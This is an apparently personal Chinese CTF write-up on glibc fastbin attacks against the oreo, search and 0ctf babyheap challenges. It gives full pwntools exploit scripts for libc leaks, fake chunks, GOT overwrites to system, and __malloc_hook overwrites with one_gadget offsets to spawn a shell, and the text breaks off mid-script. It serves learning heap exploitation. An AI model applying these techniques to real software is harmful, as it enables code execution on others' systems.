    <content type="html"><![CDATA[<p>就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒<br>好了，废话不多说，开始吧</p><a id="more"></a><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p>add<br><img src="/2020/02/07/fastbinin-attack/1.png" alt><br>里面的rifle name是从a288+25开始写，然后description是直接从a288处开始的，总共长度是56字节，地址占了四个字节，56-4 =52   description占25，name则占27<br>具体看汇编<br><img src="/2020/02/07/fastbinin-attack/2.png" alt><br>v1是pre指针     为eax+52，即最后四个字节为指针地址，而这个指针指向的是description。<br>我们可以写入的name有为56，存在溢出，可以覆写pre的地址</p><p>show<br><img src="/2020/02/07/fastbinin-attack/3.png" alt><br>这里show的内容description是指针指向的地址<br>我们可以借此leak出libc</p><p>massage<br><img src="/2020/02/07/fastbinin-attack/4.png" alt><br>进行更改的地方是a2a8里存着的地址指向的地方，利用此来get shell</p><p>order<br><img src="/2020/02/07/fastbinin-attack/5.png" alt><br>这里就是free，free完之后a2a0+1</p><p>1、使pre覆写成puts_got的地址，show的时候，description里面的内容为puts_addr<br>2、构造一个fack chunk，我们知道呢，一个chunk的结构大概是，pre_size, size,内容。我们知道a2a4的地方是写add一次就+1，a2a0是free一次+1，a2a8是存放massage指向内容的地址，可以利用这个构建一个chunk，又因为要绕过题目检查，又存name的地方也有存description的地方，所以要构造下一个chunk，把size 0x41写进去<br>3、改一个got表为system即可，这里改的是scanf，wiki里面改的是strlen（对这个函数我不是很熟，不太懂system最后的传参，就没用了），据说还可以改free_hook 为onegadget（我不会找free_hook的地址，全网搜貌似也没搜出来用这种方法的exp）</p><p>关于wiki上的exp，看了大佬的博客之后才知道以下的姿势（关于strlen的传参）<br>这样就相当于往0x0804a250指向的地址写入system。<br>这里有个新姿势：system(“ls;/bin/sh”)就相当于sytem(“ls”);system(“/bin/sh”);<br>分号代表system函数将这个参数分成两部分，先后执行里面的命令。<br>因此这里在fgets函数篡改了strlen_got后紧接着调用strlen，<br>就相当于system(p32(system_addr);”/bin/sh”) = system(p32(system_addr));system(“/bin/sh”);<br>这样就能实现最终目的了。</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">import sys</span><br><span class="line"># context.binary = &quot;./melong&quot;</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./oreo&apos;)</span><br><span class="line">elf = ELF(&apos;./oreo&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(name,description):</span><br><span class="line"># p.recvuntil(&quot;6. Exit!&quot;)</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line"># p.recvuntil(&quot;Rifle name: &quot;)</span><br><span class="line">p.sendline(name)</span><br><span class="line"># p.recvuntil(&quot;Rifle description: &quot;)</span><br><span class="line">p.sendline(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line"></span><br><span class="line">def order():</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def massage(notice):</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;4&quot;)</span><br><span class="line">p.sendline(notice)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">name = 27 * &apos;a&apos; + p32(elf.got[&apos;puts&apos;])</span><br><span class="line">add(name ,25 * &apos;a&apos;)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line">p.recvuntil(&apos;Description: &apos;)</span><br><span class="line">puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line"># libc_base = libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(&quot;/bin/sh&quot;))</span><br><span class="line">onegadget = libc_base + 0x5fbc6 #尝试过把scanf改成onegadget，但是五个都没成功。。。</span><br><span class="line">i=1</span><br><span class="line">for i in range(0x3f): </span><br><span class="line">add(&apos;a&apos; * 27 + p32(0),25 * &apos;a&apos;)  #num -&gt; 0x41</span><br><span class="line"></span><br><span class="line">#num addr = 0x804A2A4</span><br><span class="line"></span><br><span class="line">#fack chunk</span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;*27+p32(0x804A2A8),&apos;a&apos;*25)</span><br><span class="line">massage(&apos;\x00&apos;*0x24+p32(0x41)) #description&apos;s chunk</span><br><span class="line"></span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line">scanf_got = elf.got[&apos;__isoc99_sscanf&apos;]</span><br><span class="line">add(&apos;a&apos;,p32(scanf_got))</span><br><span class="line"></span><br><span class="line">massage(p32(system_addr))</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2015-search"><a href="#2015-search" class="headerlink" title="2015 search"></a>2015 search</h2><p>这题就没有很认真的写wp，就把不太明白的点记一下吧</p><p>一开始一直没想到free完一次之后可以查找’\x00’这个word，就一直很迷惑要怎么double free<br>分析两个一开始没懂的点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">index_sentence(&apos;a&apos; * 0x5d + &apos; d &apos;)  #a</span><br><span class="line">index_sentence(&apos;b&apos; * 0x5d + &apos; d &apos;)  #b</span><br><span class="line">index_sentence(&apos;c&apos; * 0x5d + &apos; d &apos;)  #c</span><br><span class="line"> </span><br><span class="line"> # a-&gt;b-&gt;c-&gt;NULL</span><br><span class="line"> search_word(&apos;d&apos;)   #正常的删除 </span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> </span><br><span class="line"> # b-&gt;a-&gt;b-&gt;a-&gt;...      </span><br><span class="line"> search_word(&apos;\x00&apos;)    #首先判断c是否满足条件，由于c是fastbin中的最后一个节点，其fd的值为0，因此不能满足i-&gt;sentence != NULL的条件，因此第一个输出时候删除的是对应的b</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除b</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除a</span><br><span class="line"> p.sendline(&apos;n&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除  libc_leak的时候添加的sentence</span><br><span class="line"> p.sendline(&apos;n&apos;)</span><br></pre></td></tr></table></figure><p> 最后是只删除了b使得  a-&gt;b-&gt;c-&gt;null 又多了一个头变成了 b-&gt; a-&gt;b-&gt;c-&gt;null 即形成了b-&gt;a-&gt;b-&gt;a-&gt;…的循环，形成了double free</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> #此时的fastbin为 b-&gt;a-&gt;b</span><br><span class="line"># 3. fastbin attack to malloc_hook nearby chunk    向malloc_hook中写东西，改写b-&gt;fd，使其指向malloc_hook附近</span><br><span class="line">fake_chunk_addr = main_arena_addr - 0x33</span><br><span class="line">fake_chunk = p64(fake_chunk_addr).ljust(0x60, &apos;f&apos;)</span><br><span class="line"> </span><br><span class="line"> index_sentence(fake_chunk)  #b的fd改成fake_addrs</span><br><span class="line"> index_sentence(&apos;a&apos; * 0x60)   #分配chunk_a</span><br><span class="line"> index_sentence(&apos;b&apos; * 0x60)  #分配chunk_b 填了chunk_b之后才能往fake_chunk里面写payload</span><br><span class="line"> </span><br><span class="line"> one_gadget_addr = libc_base + 0xf02a4</span><br><span class="line"> payload = &apos;a&apos; * 0x13 + p64(one_gadget_addr)  </span><br><span class="line"> payload = payload.ljust(0x60, &apos;f&apos;)</span><br><span class="line"> </span><br><span class="line"> index_sentence(payload)    #赋写malloc_hook为one_gadget</span><br></pre></td></tr></table></figure><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p> 先介绍一下Arbitrary Alloc<br>（来自ctf wiki）</p><p>只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><p>example<br>在这个例子，我们使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *chunk1;</span><br><span class="line">    void *chunk_a;</span><br><span class="line"></span><br><span class="line">    chunk1=malloc(0x60);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line"></span><br><span class="line">    *(long long *)chunk1=0x7ffff7dd1af5-0x8;</span><br><span class="line">    malloc(0x60);</span><br><span class="line">    chunk_a=malloc(0x60);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0</span><br></pre></td></tr></table></figure><p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure><p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f</span><br></pre></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##define fastbin_index(sz)                                                      \</span><br><span class="line">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure><p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）<br>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 <strong>malloc_hook 的内容 (在我的 libc 中</strong>realloc_hook 与__malloc_hook 是在连在一起的)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line"> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line"> $rax   : 0x7ffff7dd1afd</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f</span><br><span class="line">0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f</span><br><span class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。<br>一般都是在5或者d处（作为最后8和0结尾的地方），所以一般alloc的里面，覆盖malloc_hook的话，要 -0x33（3结尾来对齐)</p><p>okk,开始进入正题<br>在fill里面，发现可以自己重新写size再填内容，和开始alloc的大小可以不一样，然后free没有清零，以此制造overlap</p><p>第一步先 用overlap leak基址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)#0  00</span><br><span class="line">allocate(0x10)#1  20</span><br><span class="line">allocate(0x10)#2  40</span><br><span class="line">allocate(0x10)#3  60</span><br><span class="line">allocate(0x80)#4  80</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80) #覆写最后一字节，将free掉的2指向4的地址</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21) #把4的size改成0x21,下一次alloc的时候可以写入这个地方</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91) #指向4之后再将大小改回来</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80) #5 如果没有这个，free就没了，打不出来地址</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬</span><br></pre></td></tr></table></figure><p>第二步就构造chunk，使one_gadget能写到mollac_hook的地址里，<br>0x80可以写下0x60的chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure><p>idx为5，则找7f，就开始提到的arbitrary alloc的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80)#5</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬  </span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">target = main_arena - 0x33 </span><br><span class="line">addr = p64(target)</span><br><span class="line">fill(2,len(addr),addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">allocate(0x60)#4</span><br><span class="line">allocate(0x60)#target 6</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(onegadget)</span><br><span class="line">fill(6,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x100)</span><br></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fill(idx, size, content):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    